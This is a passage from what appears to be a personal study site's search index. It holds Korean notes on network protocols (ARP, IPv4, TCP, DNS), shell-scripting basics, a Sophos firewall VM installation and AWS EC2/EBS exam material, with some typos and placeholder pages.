흐름제어 수행.\n  하나의 네트워크 대역 LAN에서만 통신할 때 사용하며,다른 네트워크와 통신 할 때에는 3계층이 도와주어야만 통 신이 가능\n    Ethernet 14byte Destination Address: 데이터를 전달받은 상대방의 시스템 MAC 주소 6byte Source Address: 데이터를 전달하는 시스템의 MAV 주소 6byte 상위 프로토콜 타입: 2byte, IPv4 ( 0x0800 ), ARD ( 0x0806 )     3계층 ( Network )  ARP Protocol    ARP 프로토콜은 같은 네트워크 대역에서 통신을 하기 위해 필요한 MAC주소를 IP주소를 이용해서 알아오는 프로토콜\n  같은 네트워크 대역에서 통신을 한다고 하여도 데이터를 보내기 위해서는 7계층부터 캡슐화를 통해 데이터를 보내기 때문에 IP주소와 MAC주소가 모두 필요하며, 이 때 IP주소는 알고 있어도 MAC 주소는 모르더라도 ARP를 통해 통신이 가능\n  ARP는 같은 대역에서만 사용가능\n     Hardware type, Protocol type, Hardware Address Length, Protocol affress Length는 모두 고유의 값을 가짐\n  Opcode: 세팅이 1이면 요청, 2면 답하는 것으로 세팅 됨\n  최소는 60byte, 최대는 1514byte\n   \rARP Process\r...\r\r  목적지 주소를 알지 못해, 목적지 주소 ( MAC )자리에는 0으로 비워둠\n  인캡슐레이션 후, 주소를 알지 못해 브로드캐스트 방식으로 모두에게 요청을 보낸 후, 아이피가 맞지 않으면 버리고, 맞는 아이피를 가지고 있는 PC는 자기의 주소를 다시 송신하고, 그러면 초기 송신자는 목적지 주소( MAC )를 알 수 있게 되어지는 원리\n   발신자\n 수신자\n\r\r\r   IPv4 Protocol    IPv4는 네트워크 상에서 데이터를 교환하기 위한 프로토콜이지만, 데이터가 정확하게 전달될 것을 보장하지는 않음\n  복된 패킷을 전달하거나 패킷의 순서를 잘못 전달할 가능성도 있음 (악의적으로 이용되면 DoS 공격이 됨 )\n  데이터의 정확하고 순차적인 전달은 그보다 상위 프로토콜인 TCP에서 보장\n    구조 설명   Version: IP 프로토콜의 버전 ( 대부분이 4, 16진수 중 하나 )\n  IHL ( Hearder Length ): 헤더의 길이 표현법 = n/4 최소 20 ~ 60\n  Type of Service ( TOS ): 데이터의 형식으로 현재는 잘 쓰이지 않으며 0으로 비워둠\n  Total Length: 모두를 합친 전체의 길이를 뜻함\n  Identification: 조각화 된 데이터의 ID를 부여하는 것\n  IP Flags X: 쓰이지 않음, D: 데이터를 송싱자가 안쪽에서 설정하는 것, M: 조각화가 진행될 경우 1로 세팅, 그렇지 않을 경우 0\n  Fragment Offset: 조각화가 발생했을 때 조각들의 시작 위치를 나타내는 값\n  offset: 어느 기준으로부터 얼마만큼 떨어져있는 지를 나타냄\n  Time to Live ( TTL ) : 패킷이 유지 될 수 있는 시간 ( 횟수 ), 네트워크 장비를 지나갈 때마다 1씩 줄어듬\n       ICMP Protocol   8 ( 요청 )/ 0 ( 정상적인 응답 ) 3 ( 목적지 도착 불가능 ) / 11 ( 시간 초과 ) 5 ( 리 다이렉트, 라우팅 테이블 수정 )    4계층 ( Transport )    4계층 전송 계층 ( Transprot layer )은 송신자의 프로세스와 수신자의 프로세스를 연결하는 서비스 를 제공하는 계층이다.\n  전송 계층은 연결 지향 데이터의 스트림 지원, 신뢰성, 흐름 제어, 그리고 다중화와 같은 편리한 서비를 제공한다.\n  전송 프로토콜 중 가장 장 알려진 것은 연결 지향전송박시으로 사용하는 전송제어 프로토콜( TCP ) 단순한 전송에 사용되는 사용자 데이터 프로토콜 ( UDP ) 가 있다\n   UDP Protocol    UDP 프로토콜 ( User Datagram Protocol )은 데이터 그램 프로토콜 ( Universal Datagram Protocol )이라고 일컫기도 한다.\n  UDP의 전송 방식은 너무 단순해서 서비스의 신뢰성이 낮고, 데이터그램의 도착 순서가 바뀌거나, 중복되거나, 심지어는 통보 없이 누락 시키기도 한다.\n  UDP는 일반적으로 오류의 검사와 수정이 필요 없는 프로그램에서 수행할 것으로 가정해야 한다.\n      TCP Protocol    전송 제어 프로토콜 (Transmission Control Protocol ) 은 인터넷에 연결된 컴퓨터에서 실행되는 프로그램 간에 통신을 안정적으로, 순서대로 에러없이 교환 할 수 있다\n  TCP의 안정성을 필요로 하지 않은 애플리케이션의 경우 일반적으로 TCP 대신 비접속형 사용자 데이터그램 프로토콜 ( User Datagream Protocol )을 사용하여, TCP는 UDP보다 안전하지만 느리다\n    TCP Fags  Window: 상대방과 데이터를 주고 받을 때, 얼마만큼의 데이터를 보낼 지 정하는 역할을 수행 ( 남아있는 TCP 공간을 알려줌 ) TCP Flags : 어떤값을 보낼지 세팅하는 값 C, E: 사용하지 않음 U: Uregent ( 긴급 bit ) - 우선순위가 포함되어있음 ( 1- 급한 데이터 ) A: Acknowledgment ( 승인 bit ) P: Push ( 밀어넣기 bit ) R: Reset ( 초기화 bit ) S: Syn ( 동기화 bit ) - 상대방과 연결을 시작할 때 반드시 사용 F: Fin ( 종료 bit )     3Way Handshake \r3Way Handshake\r...\r\r  TCP를 이용한 데이터 통신을 할 때 프로세스와 프로세스를 연결하기 위해 가장 먼저 수행되는 과정\n  클라이언트가 서버에게 요청 패킷을 보내고\n  서버가 클라이언트의 요청을 받아 패킷을 보내고\n  클라이언트는 이를 최종적으로 수락하는 패킷을 보낸다.\n      과정설명   보낸 쪽에서 보낼 때는 SEQ번호와 ACK번호가 그대로이다.\n  받는 쪽에서 SEQ번호는 받은 ACK번호가 된다.\n  받는 쪽에서 ACK번호는 받은 SEQ번호 + 데이터 크기가 된다.\n    \r\r\r   7계층 ( Application )  HTTP Protocol    DNS Protocol    기존의 192.168\u0026hellip;.. 등의 호스트 도메인의 이름을 네트워크 주소로 바꾸거나 그 반대의 변환을 수행을 위해 개발되어짐\n  일반적으로 www.xxx.com과 같은 도메인 주소를 입력하면 해당 주소에 맞는 IP주소로 변환시켜주는 역할을 수행\n  \rDNS 서버는 계층 구조로 이루어져 있음\r...\r\r DNS 서버는 계층 구조   루트 DNS 서버\n 최상위 레벨의 DNS 서버\n 책임 DNS 서버\n 로컬 DNS 서버로 구성\n    \r\r\r}\n     Domain address    인터넷 상에서의 주소인 URL의 일부\n  도메인 또는 도메인 네임( Domain name )은 넓게 보면 암기 및 식별하기 어려운 IP주소를 example.com처럼 기억하기 쉽게 만들어주는 네트워크 호스트를 의미\n  보통 루트 네임 서버( 최상위 DNS서버로 JAVA에서 관리 )에 등록된 최상위 호스트 네임을 관리하는 도메인 레지스트리에서 관리하는 하위 호스트 네임을 이르는 말\n     쿼리( Query )  재귀 쿼리\n 로컬 DNS서버와 주고받는 질의와 응답     반복 쿼리\n 로컬 DNS 서버가 다른 DNS 서버와 주고 받는 응답     권한이 없는 응답\n 반복 쿼리를 통해 알아온 주소     권한이 있는 응답\n 로컬 DNS가 알고 있는 주소     ZONE 영역파일   호스트 IP를 저장하고 있는 파일      IP( Internet Protocol )은 네트워크 계층에서 사용하는 주소로, 컴퓨터는 MAC주소를 사용하지만, 사람이 읽기 힘들어 읽기 편한 IP주소를 사용 한다.\n  3계층은 다른 네트워크 대역 즉, 멀리 떨어진 곳에 존재하는 네트워크까지 어떻게 데이터를 전달할지 제어하는 일을 담당, 발신에서 착신까지의 패킷의 경로를 제어하는 역할을 수행 하며 거리가 먼 다른 기기와 통신을 위해서는 3계층이 필요하다\n           "});index.add({'id':27,'href':'/docs/network/network/','title':"Network 기본",'content':"Sophos   "});index.add({'id':28,'href':'/docs/programing/','title':"Programing",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':29,'href':'/docs/programing/python/','title':"Python",'content':"aaa\n"});index.add({'id':30,'href':'/docs/programing/shell/','title':"Shell",'content':"Shell\n"});index.add({'id':31,'href':'/docs/programing/shell/shell-1/','title':"Shell Script",'content':"Shell Script    Shell Script의 개요   UNIX/ Linux 소개 및 특징   UNIX   1969년 AT\u0026amp;T 벨연구소의 직원이 켄 톰슨, 데니스 리치, 더글라스 매클로리 등이 최초로 개발하였으며, 이후 C언어로 재작성되어 다양한 플랫폼에 이식될 수 있도록 보완되었다\n  벨연구소는 대학과 연구기관에 UNIX를 활용할 수 있도록 라이선스를 제공하였으며, 버클리 대학교에서는 UNIX에 네트워크 프로토콜인 TCP/IP 등 다양한 기능을 보강하여 BSD 배포본을 제작하고 이후 파생되는 많은 UNIX에 영향을 끼쳤다.\n      Linux   1991년 리누스 토발즈라는 핀란드 헬싱키 대학의 대학원생에 의해 커널이 개발된 이래, 1984년부터 리처드 스토람에 의해 추진된 GNU 프로젝트의 다양한 소프트웨어들이 합쳐진 운영체제가 Linux이다.\n  개인용 데스크톱 환경뿐만 아니라 안드로이드 등 스마트폼에서부터 기업용 엔터프라이즈 환경에 이르기까지 다양한 플랫폼에 이식되어 활용중이다.\n  대표적인 리눅스 배포판에는 데비안, 레드햇, 슬렉웨어, SUSE, 우분투, 젠투가 있으며 그밖에도 다양한 배포본들이 파생되어 개발되고 있다.\n       쉘의 역할 및 특징    쉘은 운영체제에서 커널(Kernel)과 사용자 사이의 인터페이스, 즉 가교 역할을 하는 프로그램으로, 운영체제의 내부 명령어나 응용프로그램을 실행하는 것을 지원\n  시스템을 전체적으로 보면 운영체제는 결국 하드웨어의 한 부분인 저장장치의 일부에 저장\n  운영체제를 좀 더 세부적으로 살펴보면, 운영체제가 설치되어 있는 저장장치(DISK 등)를 비롯하여 모니터, 그래픽카드, NIC 등 시스템에 직간접적으로 연결되는 하드웨어를 통제하는 커널과 이러한 커널과 사용자 및 응용 프로그램 사이에서의 명령을 전달을 담당하는 쉘로 구분\n  운영체제 마다 기본적으로 다양한 쉘을 제공하고 있고 사용자가 별도의 쉘을 설치해서 활용\n  CDE(Common Desktop Environment)\n 공통 데스크톱 환경(CDE)은 유닉스를 위한 그래픽 데스크톱 환경이며 모티프 위젯 툴킷을 도입하고 있다. 유닉스 표준화 단체들 가운데 하나인 공통 개방형 소프트웨어 환경이 지정한 유닉스 GUI 규격이다.       Shell의 종류     구분 개발자 설치 위치 설명     sh Stephen Bouren /bin/sh 대부분의 UNIX 및 Linux에 설치되어 있는 쉘   bash Brain, Chet Ramey /bin/bash Linux의 기본 쉘로 sh와 호환   ksh David Kron /bin/ksh 1980년대 밸 연구서에서 개발, 부동 소수점 계산이 가능   csh Bill Joy /bin/csh C언어와 비슷한 스타일로 Script를 작성 가능   tcsh Ken Greer /bin/tcsh csh에 커맨드 히스토리 등 추가 기능을 보완      Shell 종류 확인 명령어  $ ps -p $$\r$ tail /etc/passwrd\ruser01:x:500:500::/home/user01:/bin/bash\r# 마지막 필드에 기술된 쉘의 경로를 통해 확인가능\r   Shell Script    컴퓨터 사용의 편의성을 확보한 GUI 기반의 실행 환경인 Windows 초기 버전이 있었지만 DOS를 통해 구동되는 DOS의 확장 프로그램 수준이었기 때문에 일반 사용자가 쉽게 사용하기에는 어려움이 있었다.\n  이러한 번거로움을 조금이나마 해소하고자 DOS 구성 시 메모리 구성 및 드라이버 로딩을 케이스별로 메뉴로 구성하여 케이스별로 선택할 수 있는 배치 파일을 만들어 활용하는 사람들이 있었다.\n  그 당시의 배치 파일을 지금의 쉘 스크립트와 비슷한 개념으로 이해하면 된다.\n  쉘 스크립트 : 운영체제의 쉘에서 사용할 수 있는 명령어를 해석하고 그 결과를 커널에게 전달하는 프로그램\n  쉘 : 사용자가 내린 명령어를 해석하고 그 결과를 커널에게 전달하는 프로그램\n     쉘 스크립트 활용 시 이점   반복 작업에 대한 자동화 기능  쉘 스크립트를 활용하는 가장 큰 장점은 관리자의 번거로움을 덜 수 있다. 스케줄 설정과 같이 주기적으로 수행하는 단순한 작업에 단순한 작업에 쉘 스크립트를 활용하면 관리자가 일일이 타이핑하지 않아도 된다.      기존의 명령어를 사용자만의 명령어로 보완  기본적으로 UNIX/Linux는 POSIX라는 표준 규약을 준수하지만 모든 명령어가 통일된 것은 아니기 때문에 운영체제 마다 명령 옵션이나 결과 형식에 약간의 차이가 있다. 운영체제에서 제공하는 명령어 실행 결과를 사용자가 원하는 형식으로 재구성해야 할 때가 있다. 예시  운영체제가 다른 시스템에서 동일한 형태의 로그를 추출해야 할 때가 있다. 이 경우, 쉘 스크립트를 이용하여 기존의 명령어의 결과를 원하는 형태의 결과로 표시할 수 있다. 이를 위해 입출력 재지정(Rdirection)을 활용        손쉽고 빠른 개발 및 보완이 가능  기본적으로, 쉘 스크립트 자체는 운영체제의 명령어 등을 묶어서 프로그램화한 후 인터프리터 방식으로 수행되기 때문에 별도의 컴파일러를 설치할 필요가 없다. 운영체제의 명령어들을 잘 알고 있다면 손쉽고 빠른 개발 및 보완이 가능 필요한 절차를 기술하는 것 시스템 관리자가 관리하는 여러 대의 서버 및 원격지에 있는 서버를 설정하거나 패치할 때 쉘 스크립트를 활용하면 설정 및 패치 작업을 보다 더 효율적으로 할 수 있다.       POSIX(Portable Operating System Interface)  서로 다른 UNIX OS의 공통 API를 정리하여 이식성이 높은 유닉스 응용 프로그램을 개발하기 위한 목적으로 IEEE가 책정한 어플리케이션 인터페이스 규격 대부분의 시스템들이 AT\u0026amp;T에서 개발된 UNIX에 뿌리를 두고 있지만 시간이 흐르면서 다양한 제조사와 개발자의 손을 거치면서 운영체제별 의존성 문제가 발생 POSIX는 운영체제별 의존성 문제를 해결하기 위해 서로 다른 UNIX 운영체제에서 공통 API를 정리하여 운영체제간 이식성이 높은 UNIX 응용 프로그램을 개발하기 위한 목적으로 제정된 API 규격     Shell Script 학습 환경 구축   기본적인 준비 프로그램   x86에 설치되지 않는 UNIX/Linux 버전은 사용이 불가능하다.(IMB의 AIX, HP의 HP-UX, SUN의 SPARC CPU 버전 Solaris 등)\nVMware 또는 VirtualBox 설치\n기본 용량 cpu 1/1, ram 1GB, HDD 8GB(VDI, 동적할당)\nPuTTY를 통해 ssh 접속\nPuTTY의 문자를 UTF-8로 변경\n  운영체제 이미지 파일 다운로드     구분 운영체제/ 배포본 웹 사이트 주소     UNIX solaris http://www.oracle.com/kr/index.html     FreeBSD http://www.freebsd.org/     NetBSD http://www.netbsd.org/     OpenBSD http://www.openbsd.org/   UNIX ubuntu http://www.ubuntu.com/index_roadshow     fedora http://getfedora.org/     CentOS http://www.centos.org/     KALI linux https://www.kali.org/     SUlinux https://www.sulinux.net/2014/       ****         #\n"});index.add({'id':32,'href':'/docs/network/snort/','title':"Snort",'content':"a\n"});index.add({'id':33,'href':'/docs/network/sophos/sophos_1/','title':"Sophos 설치",'content':"Sophos 설치    구성환경    Sophos는 nat을 외부대역으로 Host 2 ( 20.20.20.0/24 )를 내부대역으로 갖습니다. Sophos의 설치를 위해 내부 대역 ( Host 2 )의 Win 7을 통해 설치를 진행합니다.      Sophos 설치를 위한 Vm을 설정합니다.       운영체제 버전에서 Other Linux 2.6x kernel을 선택합니다. 그 후 RAM 1G 디스크 20G 외에는 기본 값으로 진행합니다.      위 그림과 같이 설정이 생성이 완료되면 설정을 위해 Edit virtual machine settings를 클릭합니다.      위 그림과 같이 세팅을 마무리 합니다. CD/DVD에 sophos 이미지 파일의 경로를 지정합니다. 네트워크 어뎁터를 추가로 설정합니다. 여기서는 Nat와 Host 2 ( 20.20.20.0/24 )를 설정하였습니다.      가상머신을 시작하면 설치화면이 나옵니다. Enter을 눌러 설치를 진행합니다.      현재 설치하는 가상머신에 설치가 가능한지 테스트를 진행합니다.      테스트가 완료되면 설치를 진행합니다.      언어와 시간을 선택합니다. ( 영어로 선택하시면 됩니다. )      내부대역 네트워크 인터페이스를 선택합니다. 가상머신 설정 순서대로임을 반드시 기억해주세요. 저는 위 부터 Nat, Host 2로 설정이 되어있어, Host 2 ( 하단 )를 선택했습니다.      Nat 인터페이스의 IP를 설정합니다.      설치가 완료되면 재부팅 후, 다음과 같은 화면이 출력됩니다. 그 후, https://[ IP ]/:4444/로 접속하라는 안내창이 나옵니다. 여기서 주의하실 점은 같은 대역이 아니면 접근이 불가능하다는 것을 유의하셔야 합니다.      해당 아이피의 4444번 포트로 접속하면 다음과 같은 화면이 나옵니다. 여기에서는 고급을 클릭하여 페이지로 이동합니다.      접속이 성공하면 다음과 같은 화면이 나오는 데, 설정 값들을 기입 후 진행합니다. 설정이 완료되면 로그인화면으로 이동됩니다.      초기 설정에서 입력한 값으로 로그인을 진행합니다.      초기 설정을 위해 Continue를 체크 후 진행합니다.      Licenese가 없으므로 체험판으로 진행해보도록 하겠습니다. ( 30일 무료 )      Internal Network 셋팅입니다. 이는 이미 설치 과정에서 진행하였습니다. 변동이 없다면 다음으로 진행합니다.      다음으로는 external 설정 값입니다. Network Interface에 따라 설정합니다. 인터페이스가 2개면 내부 1, 외부 1, 3개면 내부 2, 외부 1이런 방식입니다. 저는 nat, Host 2을 사용하기에 여기선 Nat의 설정 값을 기입후 진행하겠습니다.      각종 프로토콜, 서비스에 대한 보안설정입니다. 여기서는 아직 셋팅하지 않으므로, 넘어가도록 하겠습니다.      최종 셋팅 값을 보여줍니다. 확인을 누르시면 설정이 완료됩니다. #xxxxxxx     Sophos의 설치가 완료되었습니다. 다음 장에서 부터는 본격적으로 Sophos를 다뤄보도록 하겠습니다.     "});index.add({'id':34,'href':'/docs/cloudcomputing/awssaa/saa-2/','title':"2장 EC2와 EBS",'content':" 2장 Amazon Elastic Compute Cloud와 Amazon Elastic Block Store  2장의 목표  복원력은 갖춘 아키텍처 설계  안정적이고, 복원력을 갖춘 스토리지를 선택 어떻게 고가용성 및/ 또는 내결함성을 갖춘 아키텍처를 설계할지를 결정      성능이 뛰어난 아키텍처 정의  성능이 뛰어난 스토리지 및 데이터베이스를 선택 탄력성과 확장성을 갖춘 솔루션을 설계      안전한 애플리케이션 및 아키텍처 설명  어떻게 애플리케이션 티어를 보호할지를 결정 어떻게 데이터를 보호할지 결정   비용에 최적화된 아키텍처 설계  어떻게 비용에 최적화된 스토리지를 설계할지를 결정 어떻게 비용에 최적화된 컴퓨팅을 설계할지 결정       EC2 인스턴스    EC2는 물리 서버의 기능을 함축적으로 가상화한 실제 서버와 유사하게 작동\n  스토라지, 메모리, 네트워크 인터페이스가 새로 설치 된 기본 드라이브가 제공\n     EC2 Amazon Machin Image ( AMI )   AMI란 EC2를 시작할 때, 루트 볼륨에 설치될 운영 체제와 소프트웨어를 기술한 템플릿 문서 AMI의 종류     종류 설명     Amazon 바른 시작 AMI 자주 이용되는 Linux, Windows 등이 등록되어지고, 최신 버전으로 업데이트, 공식적으로 지원하는 이미지   AWS Marketplace AMI AWS Marketplace AWS에서 공식적으로 지원하는 이미지이며, SAP, 시스코와 같은 공급업체가 제공 및 지원   Community AMI 100.000개 이상의 이미지가 제공디고 있으며, 특정한 요구에 맞게 커스터마이징 된 이미지   Private AMI 사용자가 자체 배포한 인스턴스에서 이미지를 생성해서 저장한 이미지, S3에 저장할 수 있으며, 이를 통해 As기능을 사용할 수 있다.       EC2 Instacne Type   AWS는 사용자가 선택한 하드웨어 프로파일, 즉 인스턴스 유형에 따라 하드웨어 리소스를 인스턴스에 할당한다. AWS를 이용하는 사용자는 자신의 니즈에 맞게 인스턴스의 유형을 사용함으로써 자원을 효율적으로 이용할 수 있다. 인스턴스의 유형은 자주 변경되며 AWS Instance Type에서 확인할 수 있다. EC2 인스턴스 유형 패밀리와 최상위 명칭     인스턴스 유형 패밀리 유형     범용 T3, T2, M5, M4   컴퓨팅 최적화 C5, C4   메모리 치적화 X1e, X1, R5, R4, z1d   가속화된 컴퓨팅 P3, P2, G3, F1   스토리지 최적화 H1, l3,D2      범용 서비스 : 컴퓨팅, 메모리, 네트워크, 리소스를 균형 있게 제공하며, 리소스의 확장이 쉽다. M5, M4 : 주로 중소 규모 데이터 운영에 권장되며, M 인스턴스는 실제 호스트 서버에 물리적 연결된 내장 인스턴스 스토리지 드라이브와 함께 제공 컴퓨팅 최적화 : 대규모 요청을 받는 웹 서버와 고성능 머신 러닝 워크로드에 적합 메모리 최적화 : 처리량이 많은 데이터베이스, 데이터 분석, 캐싱 작업에 유용 가속화된 컴퓨팅 : 고성능 범용 그래픽 처리 장치(GPGPU)가 제공되어, 3D 시각화/ 렌더링, 재무 분석, 전산 유체역학 같은 고부하 워크로드 인스턴스에 적합 스토리지 최적화 : 지연시간이 짧은 대용량 인스턴스 스토리지 볼륨을 사용     AWS Region   사용자는 AWS의 데이터 센터의 서버를 이용할 것이며, 이는 지리적 리전으로 구성되어 있다. EC2 리소스느 사용자가 선택한 리전에서만 관리할 수 있으며, 각 리전에 따라 서비스와 기능은 물론 비용도 다르므로 최신 공식 문서를 확인해야한다.     Virtual Private Cloud ( VPC )   VPC는 사용자가 사용할 네트워크 내부대역을 생성하는 것으로, 프로젝트 단위로 작업을 허용하기 유용하다. 다중 VPC를 생성해도 금액이 발생하지 않으며, NATgateway, VPN 서비스를 사용하는 경우에는 비용이 발생된다.     태넌시   EC2 인스턴스를 시작할 때, 테넌시 모델을 선택할 수 있다. 기본 설정은 공유 테넌시이며, 여러 인스턴스가 한 물리 서버에서 동시에 가상 머신으로 실행된다.     인스턴스 동작 구성   인스턴스를 생성할 때, 이를 부트스트랩이라 하며, 스크립트 파일을 작성하거나, CLI에서 user-data 값을 사용하면 필요한 상태로 인스턴스를 구성할 수 있다.     인스턴스 요금   세 가지 모델 중에서 하나를 선택해 EC2 인스턴스를 구매해서 사용할 수 있다.     요금 모델 설명     온 디맨드 사용자가 사용한 만큼만 비용이 발생하게 구성   예약 미리 사용량을 할당받아 정해진 만큼 지불하며, 1, 3년으로 구성   스팟 특정 리전에서 실행되는 인스턴스 유형에 대해 사용자가 최대 입찰 요금을 입력해서 인스턴스를 사용       리소스 태그   AWS 계정에 리소스를 다수 배포할수록 추적이 어려워진다. 또한 다수의 VPC, 보안 그룸, 볼륨 등과 연계되면 복잡성은 한 층 더 강해진다. 이를 위해 AWS 계정에서는 리소스를 빠르게 식별할 수 있도록 리소스마다 목적 및 다른 리소스와의 관계 등을 정리할 수 있다. 리소스 태그는 키/ 값으로 구성된다.     키 값     production-server server1   production-server security-grouop1   staging-server server1   test-server security-grouop1       서비스 할당량   한 리전당 생성할 수 있는 VPC의 수는 5개 허용된 키 페어의 수는 5.000개 그 외의 추가적인 제한은 AWS 최신 할당량 정보     EC2 Storage Voulme   볼륨은 스토리지 드라이브로, 물리 드라이브를 가상으로 나눈 공간을 의미한다. AWS에서는 여러 유형의 볼륨 드라이브가 있으며, 각 유형이 동작하는 방식이 달라 이해가 필요하다.     Elastic Block Store Volume ( EBS )   EBS는 필요한 수 만큼 인스턴스에 연결할 수 있으며, 물리 서버의 하드 드라이브, 플래시 드라이브, USB 드라이브와 유사하게 사용된다. 물리 드라이브에서와 같이 어떤 EBS 볼륨 유형을 선택하느냐에 따라 성능과 비용은 달라진다. AWS SLA에서 99.999%의 가용성으로 충분한 안정성을 가지고 있다. EBS의 볼륨 유형     볼륨 타입 설명     EBS 프로비저닝 된 IOPS SSD 고성능 I/O 작업이 필요할 때 최대 32.000 IOPS와 최대 500MB/s 처리량을 제공한다.   EBS 범용 SSD 대다수 일반 서버 워크로드에서 사용되며, 이론적으로 짧은 징녀 시간 성능을 제공한다.   처리량 최적화 HDD 로그 처리와 빅 데이터 작업 등의 높은 처리량을 요구하는 워크로드에 적합한 성능을 저렴한 비용에 제공한다.   콜드 HDD 번번하게 엑세스하지 않는 대용량 작업에 콜드 HDD는 가장 낮은 가격에 제공한다.       EBS 볼륨 기능   모든 EBS 볼륨은 스냅샷을 통해 복사할 수 있고, 기존 스냅샷을 다른 인스턴스에 공유해서 연결할 수 있으며, AMI로 등록할 수 있는 이미지로 변경할 수 있다. EBS 볼륨은 암호화해서 EC2 인스턴스가 저장하거나 송수힌 하는 데이터를 보호할 수 있으며, EBS에서는 내부에서 암호화 키를 자동으로 관리하거나 AWS KMS에서 제공되는 키를 사용할 수 있다.     인스턴스 스토어 볼륨   인스턴스 슽어 볼륨은 EBS 볼륨과는 다른 임시 디스크로, 디스크가 연결된 인스턴스가 종료되었을 때, 영구히 삭제된다. EBS 대신 인스턴스 스토어 볼륨을 사용하는 경우는 다음과 같다.  인스턴스 스토어 볼륨은 인스턴스를 호스팅하고 있는 서버에 물리적 고속 NVMe 인터페이스로 연결된 SSD이다. 인스턴스 스토어 볼륨 요금은 인스턴스 요금에 포함되어 있다. 인스턴스 스토어 볼륨은 단기 역할 수행이나 외부에서 데이터를 가져와서 처리 후, 폐기하는 배포 모델에 적합하다.       EC2 인스턴스 엑세스   EC2 인스턴스는 네트워크에 연결된 모든 장치와 마찬가지로 고유한 IP로 식별 네트워크 인스턴스의 범위      처음 주소 끝 주소     10.0.0.0 10.255.255.255   172.16.0.0 172.31.255.255   192.168.0.0 192.168.255.255     프라이빗 서브넷으로 생성된 인스턴스는 서브넷 내부에서만 통신할 수 있고, 인터넷에는 직접 연결할 수 없다. 다른 리소스와 연결등의 필요로 인스턴스에 여러 네트워크 인터페이스가 있어야 하는 경우, 하나 이상의 가상 탄력적 네트워크 인터페이스를 만들어 연결할 수 있다.     EC2 인스턴스 보안   사용자에게는 무단으로 EC2 인스턴스가 사용되지 않도록 적절하고 효과적으로 엑세스 제어를 구성해야할 책임이 있다. AWS는 이를 위해 보안 그룹, IAM 역할, NAT 인스턴스, 키 페어 등 네 가지 도구를 지원한다.     보안그룹   EC2 보안 그룹은 방화벽 역할을 한다. 보안 그룹의 기본 설정은 수신하는 모든 트래픽을 거부하며, 보안 그룹에 지정한 트래픽 유형만을 허용하는 정책 규칙을 설정한다. 보안그룹은 트래픽 유형만을 허용하는 정책 규칙을 설정하며, 네트워크에서 송수신하느 모든 데이터 패킷은 그 규칙에 따라 평가해서 허용 및 거부된다.     IAM   IAM이란 루트 계정이 아닌, 다른 사용자를 생성하여 역할(권한)을 부여함으로써, 사용가능한 범위를 분리시키는 것 IAM 역할을 사용해서 EC2 인스턴스를 비롯한 AWS 리소스에 엑세스 하는 것에 대한 제어가 가능     NAT 디바이스   인터넷이 항상 필요한 것이 아닌, 업데이트 등의 주기적으로 필요할 때만 인스턴스에 인터넷을 연결하도록 하는 서비스 NAT 게이트 웨이 or NAT 인스턴스로 프라이빗 게이트웨이를 지정함으로써 사용할 수 있다.     키 페어   키 페어는 암호화방식으로 키 값을 생성 후, 페어에 맞는 키만이 인스턴스의 접속이 가능하도록 한다.     기타 EC2 서비스  AWS System Manager   System Manager은 AWS 클라우드와 온프레미스 인프라를 운영하는 리소스를 모니터링 및 관리하기 위한 도구의 모음     배치 그룹   배치 그룹은 지연 시간이 짧은 네트워크 상호 연결이 필요한 여러 EC2 인스턴스에 효율적으로 사용된다. 클러스터 그룹은 단일 가용 영역 안에서 물리적으로 접근 및 서로 연결된 인스턴스로 시작 분산형 그룹은 장애 관련 데이터나 서비스 손실 윟머을 줄이기 위해 물리적으로 분리된 하드웨어 인스턴스를 분산     AWS Elastic Container Service와 AWS Fargate   대규모 Docker 컨테이너 기반에서 실행되는 애플리케이션은 본질적으로 AWS와 같은 플랫폼에 적합 미리 사용된 미리 구축된 Docker를 사용하여 다른 AWS 서비스와 연계하여 사용할 수 있음     AWS Lambda   서버리스 애플리케이션은 프로그래밍 코드 기반으로 실행 서버에서 동작하지만 사용자가 서버를 제어하는 대신, 사전 설정된 이벤트로 Lambda 서버를 트리거해서 코드를 실행 및 구성     VM Import/ Export   Local의 VMware 이미지를 S3를 통해 AWS상에서 사용할 수 있게 하는 서비스     Elastic Load Balancing과 Auto Scaling   로드 밸런서는 효율적으로 트래픽을 관리하고 여러 EC2 인스턴스에 전송해 서버 리소스를 효율적으로 분산하여 사용하는 서비스     2장 요약    Amazon머신 이미지 ( AMI )를 선택하고 시작할 때 스크립트나 user data를 입력해서 EC2의 기본 소프트웨어 스택을 정의\n  인스턴스 유형으로 하드웨어 프로파일을 정하며, 태넌시 설정으로 다른 인스턴스와 물리적 호스트를 공유할 것인지를 결정\n  EC2 인스턴스를 비롯한 모든 AWS 리소스에 시스템 전반의 명명 규칙에 따라서 쉽게 식별할 수 있게 태그를 부여할 수 있다.\n  리소스의 제한이 있으머, 할당량을 넘는 리소스를 생성할 때에는 추가적인 신청을 해야한다.\n  1년 이상 인스턴스를 실행할 때, 온디매드 대신 예약 인스터느를 구매하며 크게 비용을 절약할 수 있다.\n  서비스가 끊끼는 게 중요하지 않은 경우, 스팟 인스턴스를 사용하는 것이 합리적이다.\n  EBS에는 4가지 볼륨 유형이 있다.\n  높은 IOPS와 짧은 지연 시간을 지원하는 두 가지 SSD 유형과 두 가지 기존 하드 디스크 드라이브 유형이 있다.\n  볼륨 선택은 워크로드와 예산에 따라 결졍되며, 인스턴스 유형에는 임시 인스턴스 스토어 볼륨이 사용된다.\n  일부 EC2 인스턴스 유형에는 임시 인스턴스 스토어 볼륨이 사용되는 데, 스토어 볼륨은 데이터 엑세스는 빠르지만 인스턴스가 종료되면 데이터가 종료된다.\n    모든 EC2 인스턴스는 최소 하나의 프라이빗 주소를 가지고 있으며, 인터넷 엑스세가 필요하면 임시 퍼블릭 IP 주소를 할당한다.\n  EIP를 통해 영구적인 IP를 할당할 수도 있다.\n  EC2 인스턴스를 보호하기 위해서 보안 그룹이라고 하는 소프트웨어 방화벽으로 액세스를 허용하거나 차단하고, IAM 역할, NAT 인스턴스/ 게이트웨이, 키 페어 등이 사용된다.\n     시험핵심    EC2 인스턴스를 프로비저닝하고 시작하는 방법을 이해한다.\n  워크로드에 